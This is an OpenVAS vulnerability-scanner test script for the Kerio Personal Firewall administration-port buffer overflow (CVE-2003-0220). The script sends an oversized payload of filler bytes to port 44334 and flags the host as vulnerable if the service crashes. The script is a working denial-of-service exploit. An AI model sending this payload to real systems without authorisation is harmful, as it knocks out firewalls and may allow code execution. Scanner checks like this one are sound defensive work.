###############################################################################
# OpenVAS Vulnerability Test
# $Id: kerio_PF_buffer_overflow.nasl 4233 2016-10-07 10:53:48Z cfi $
#
# Kerio personal Firewall buffer overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Exploit string by Core Security Technologies
# Changes by rd : uncommented the recv() calls and tested it.
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# Date: Mon, 28 Apr 2003 15:34:27 -0300
# From: "CORE Security Technologies Advisories" <advisories@coresecurity.com>
# To: "Bugtraq" <bugtraq@securityfocus.com>, "Vulnwatch" <vulnwatch@vulnwatch.org>
# Subject: CORE-2003-0305-02: Vulnerabilities in Kerio Personal Firewall
#
# From: SecuriTeam <support@securiteam.com>
# Subject: [EXPL] Vulnerabilities in Kerio Personal Firewall (Exploit)
# To: list@securiteam.com
# Date: 18 May 2003 21:03:11 +0200

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11575");
  script_version("$Revision: 4233 $");
  script_tag(name:"last_modification", value:"$Date: 2016-10-07 12:53:48 +0200 (Fri, 07 Oct 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-0220");
  script_bugtraq_id(7180);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Kerio personal Firewall buffer overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Firewalls");
  script_dependencies("kerio_firewall_admin_port.nasl");
  script_require_ports("Services/kerio", 44334);
  script_mandatory_keys("kpf_admin_port/detected");

  tag_summary = "Kerio Personal Firewall is vulnerable to a buffer overflow
  on the administration port.";

  tag_impact = "A cracker may use this to crash Kerio or worse, execute arbitrary
  code on the system.";

  tag_solution = "Upgrade your personal firewall";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_vul"); 

  exit(0);
}

port = get_kb_item( "Services/kerio" );
if( ! port ) port = 44334; # Default port
if( ! get_port_state( port ) ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

b = recv( socket:soc, length:10 );
b = recv( socket:soc, length:256 );

expl = raw_string( 0x00, 0x00, 0x14, 0x9C );
expl += crap( 0x149c );
send( socket:soc, data:expl );
close( soc );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

close( soc );
exit( 99 );